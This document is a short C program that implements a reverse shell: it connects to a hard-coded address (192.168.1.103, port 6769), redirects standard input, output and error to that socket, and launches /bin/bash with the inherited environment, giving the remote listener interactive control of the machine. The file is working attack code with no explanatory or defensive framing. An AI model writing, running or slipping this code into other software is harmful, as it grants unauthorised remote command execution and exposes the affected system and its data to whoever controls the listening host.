#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 6769

int main(void)
{
    int sock_fd;
    struct sockaddr_in server_addr;
    
    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    inet_pton(AF_INET, "192.168.1.103", &server_addr.sin_addr);
    
    connect(sock_fd, (struct sockaddr*)&server_addr, sizeof(server_addr));
    
    // Redirect stdin, stdout, stderr to the socket
    dup2(sock_fd, 0);
    dup2(sock_fd, 1);
    dup2(sock_fd, 2);
    
    // Spawn interactive shell with inherited environment
    extern char **environ;
    char *argv[] = {"/bin/bash", NULL};
    execve("/bin/bash", argv, environ);
    
    return 0;
}